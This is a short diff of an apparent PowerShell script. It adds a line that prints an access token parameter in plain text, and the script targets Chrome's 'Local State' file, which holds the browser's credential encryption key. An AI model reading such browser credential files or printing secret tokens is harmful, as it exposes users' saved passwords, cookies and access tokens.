@@ -4,6 +4,8 @@ param(
     [string]$AccessToken
 )
 
+Write-Output "AccessToken1: $AccessToken"
+
 # Specify the path to the Local State file
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
